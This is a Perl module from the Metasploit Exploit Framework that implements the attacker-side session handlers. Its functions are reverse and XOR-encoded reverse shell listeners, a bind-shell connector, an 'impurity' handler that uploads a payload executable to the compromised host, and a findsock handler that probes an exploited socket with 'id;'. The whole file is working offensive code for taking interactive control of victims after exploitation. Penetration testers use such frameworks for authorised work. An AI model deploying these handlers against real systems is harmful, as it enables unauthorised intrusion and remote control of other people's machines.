#!/usr/bin/perl
###############

##
#         Name: HandlerCLI.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::HandlerCLI;
use base 'Msf::Handler';
use IO::Socket;
use IO::Select;
use POSIX;
use Pex;

use strict;

sub ConsoleStart
{
    my $self = shift;
    
    my $con;
    my $stdpipe = 0;

    if($^O eq "MSWin32")
    {
        # no such thing as nonblock/select on non-sockets under win32 :(
	    socketpair($con, my $wri, AF_UNIX, SOCK_STREAM, PF_UNSPEC) || die "socketpair: $!";
	    shutdown($con, 1);
	    shutdown($wri, 0);

	    $stdpipe = fork();
	    if (! $stdpipe)
	    {
                my $input;
                while(sysread(STDIN, $input, 1)){ syswrite($wri, $input, length($input)); }
                exit(0);
	    }
        $self->{"CONSOLE"} = {"FD" => [$con, $wri], "PID" => $stdpipe};
    } else {
        $con = *STDIN;
        $self->{"CONSOLE"} = {"FD" => [$con]};
    }
    return $con;
}

sub ConsoleStop
{
    my $self = shift;
    
    # shutdown the win32 console pump
    if ($^O eq "MSWin32")
    {
        foreach my $fd (@{$self->{"CONSOLE"}->{"FD"}}) { $fd->close(); }
        kill(9, $self->{"CONSOLE"}->{"PID"}) if defined($self->{"CONSOLE"}->{"PID"});
    }
}

sub reverse_shell
{
    my ($self, $pay, $opt, $exploit) = @_;
    
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $self->GetVar('LPORT'),
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $self->set_error("could not start listener: $!");
        return undef;
    }

    # put server into non-blocking mode
    Pex::Unblock($s);

    my $stopserver = 0;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            my $victim = $s->accept();
            
            # terminate the exploit process
            kill(9, $exploit);

            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $victim);

            $self->DataPump($console, $victim, $callback);

            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $victim);
            $victim->close();
            undef($victim);

        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill("TERM", $exploit) }

    # clean up the listening socket
    $s->shutdown(2);
    $s->close();
    undef($s);

    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};

    # return back to the calling module
    print STDERR "[*] Exiting Shell Listener...\n";
    return(1);
}

sub bind_shell
{
    my ($self, $pay, $opt, $exploit) = @_;
    my $stopconnect = 0;
    my $victim;

    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopconnect++ };
    $SIG{"INT"}  = sub { $stopconnect++ };

    while ($stopconnect == 0)
    {
       $victim = IO::Socket::INET->new (
                    Proto => "tcp",
                    PeerAddr => $self->GetVar('RHOST'),
                    PeerPort => $self->GetVar('LPORT'),
                    Type => SOCK_STREAM,
       );

       Pex::Unblock($victim);

       if ($victim)
       {
            for (1 .. 4)
            {
                if ($stopconnect == 0 && $victim->connected())
                {
                    $stopconnect++;
                    kill(9, $exploit);

                    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

                    my $console = $self->ConsoleStart();
                    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
                    $callback->("CONNECT", $victim);
                    $self->DataPump($console, $victim, $callback);
                    $self->ConsoleStop($console);
                    $callback->("DISCONNECT", $victim);
                } else {
                    select(undef, undef, undef, 0.5);
                }
            }
        } else {
            select(undef, undef, undef, 1);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopconnect++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill(9, $exploit) }

    # restore the signal handlers
    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};
    
    # return back to the calling module
    print STDERR "[*] Exiting Shell Connector...\n";
    return(1);
}


sub impurity_reverse
{
    my ($self, $pay, $opt, $exploit) = @_;

    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $self->GetVar('LPORT'),
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $self->set_error("could not start listener: $!");
        return undef;
    }

    # put server into non-blocking mode
    Pex::Unblock($s);

    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    my $stopserver = 0;
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            my $victim = $s->accept();
            kill(9, $exploit);

            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
           
            if(! open(X, "<".$self->GetVar('PEXEC')))
            {
                print STDERR "ERROR\n";
                print "[*] Could not open payload executable file: $!\n";
                kill(9, $exploit);
                return;
            }

            binmode(X);
            my $bindata;
            while (<X>) { $bindata .= $_ }
            close (X);
            
            print STDERR "[*] Uploading " . length($bindata) . " bytes...";
            # Verify that all data is written... 
            my $bsize = length($bindata);
            my $bres = 0;
            while ($bres < $bsize)
            {
                 my $res = $victim->send($bindata);
                 if ($res <= 0)
                 {
                    print STDERR " Error ($res)\n";
                    return;
                 }
                 
                 $bres += $res;
                 $bindata = substr($bindata, $res);
            }
            print STDERR " Done\n";
            print STDERR "[*] Switching to impurity payload\n\n";

            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $victim);
            $self->DataPump($console, $victim, $callback);
            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $victim);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill(9, $exploit) }

    # restore the signal handlers
    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};
    
    # return back to the calling module
    print STDERR "[*] Exiting Shell Listener...\n";
    return(1);
}

sub findsock_shell
{
    my ($self, $pay, $opt, $exploit) = @_;
    my $s = $self->GetVar('HCSOCK');
    Pex::Unblock($s);

    my $stopserver = 0;
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            print STDERR "[*] Got data from handler child\n";
            $stopserver++;

            # read the notification from the client
            my $hello = <$s>;
            
            # check to see if the exploit gave up
            if (! defined($hello))
            {
                print STDERR "[*] Exploit returned an empty intialization line\n";
                return;
            }
            
            chomp($hello);
            
            print STDERR "[*] Exploit: $hello\n";
            print $s "THANKS\n";
            
            # attach the exploit to the console
            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $s);
            $self->DataPump($console, $s, $callback);
            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $s);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }


    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill(9, $exploit) }

    # return back to the calling module
    print STDERR "[*] Exiting Findsocket Handler...\n";
    return(1);
}

sub findsock_shell_exp
{
    my ($self, $e) = @_;

    # this is our socket to the parent
    my $s = $self->GetVar('HPSOCK');
    Pex::Unblock($s);
    
    # this is our socket to the exploited service
    my $x = $e->get_socket;
    
    
    # print STDERR "DEBUG: self=$self | s=$s | e=$e | x=$x\n";
    
    # send probe string
    $e->send("id;\n");
    
    my $r = $e->recv(1);
    
    if ($r =~ /uid|internal or external/)
    {
        print $s "Shell on " . $x->peerhost . ":" . $x->peerport . "\n";
        
        print STDERR "[*] Findsock payload successful: $r";

        $r = <$s>;
        while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
        
        $self->DataPump($s, $x, sub { });
        exit(0);
    }
}

sub reverse_shell_xor
{
    my ($self, $pay, $opt, $exploit) = @_;
    
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $self->GetVar('LPORT'),
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $self->set_error("could not start listener: $!");
        return undef;
    }

    # put server into non-blocking mode
    Pex::Unblock($s);
    
    my $xor_key = $self->GetVar('XKEY');
    my $stopserver = 0;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            my $victim = $s->accept();
            
            # terminate the exploit process
            kill(9, $exploit);
            
            $self->PrintLine("[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...");
            $self->PrintLine("");

            my $console = $self->ConsoleStart();
            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
            $callback->("CONNECT", $victim);

            $self->DataPumpXor($console, $victim, $callback, $xor_key);

            $self->ConsoleStop($console);
            $callback->("DISCONNECT", $victim);
            $victim->close();
            undef($victim);

        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill("TERM", $exploit) }

    # clean up the listening socket
    $s->shutdown(2);
    $s->close();
    undef($s);

    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};

    # return back to the calling module
    print STDERR "[*] Exiting Shell Listener...\n";
    return(1);
}

1;
